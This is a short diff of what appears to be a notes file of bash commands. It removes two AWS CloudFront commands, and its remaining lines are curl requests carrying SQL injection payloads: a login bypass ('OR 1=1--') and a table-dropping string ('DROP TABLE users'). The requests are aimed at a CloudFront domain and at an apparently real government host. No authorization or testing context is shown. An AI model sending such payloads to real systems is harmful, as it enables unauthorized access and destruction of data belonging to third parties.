@@ -283,11 +283,6 @@ echo -n '1f2d1e2e67df' | base64
 ```bash
 curl -o /dev/null -s -w 'Total: %{time_total}s\n' "link-static-website-s3"
 
-# Create distribution
-aws cloudfront create-distribution --origin-domain-name link-static-website-s3 --default-root-object index.html
-# List cloudfront distributions
-aws cloudfront list-distributions --query "DistributionList.Items[*].{ID:Id,DomainName:DomainName,Origin:Origins.Items[0].DomainName}"
-
 curl "https://dgacknbfyj65z.cloudfront.net/login?user=admin' OR 1=1--"
 curl "https://dgacknbfyj65z.cloudfront.net/search?query='; DROP TABLE users;--"
 curl "https://cenvul.igp.gob.pe/search?query='; DROP TABLE users;--"
